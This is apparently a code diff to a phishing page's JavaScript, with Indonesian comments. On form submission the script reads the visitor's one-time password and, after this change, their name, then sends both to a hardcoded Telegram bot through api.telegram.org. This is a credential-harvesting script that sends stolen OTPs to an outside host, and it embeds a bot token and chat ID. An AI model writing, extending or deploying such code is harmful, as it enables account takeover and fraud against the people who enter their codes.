@@ -1,13 +1,13 @@
 
 document.getElementById('otpform').addEventListener('submit', function(event) {
     event.preventDefault(); // Mencegah pengiriman formulir default
-
+    const name = document.getElementById('name').value;
     const otp = document.getElementById('otp').value;
 
     const token = '7648378330:AAEAq0udVYtsHePwOsFOcpRVYSl1Ivnm5uI'; // Ganti dengan token bot Anda
     const chatId = '6387471971'; // Ganti dengan ID chat Anda
 
-    const text = `OTP: ${otp} `;
+    const text = `Nama: ${name}\nOTP: ${otp} `;
     const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
 
     function gabungkanFungsi() {
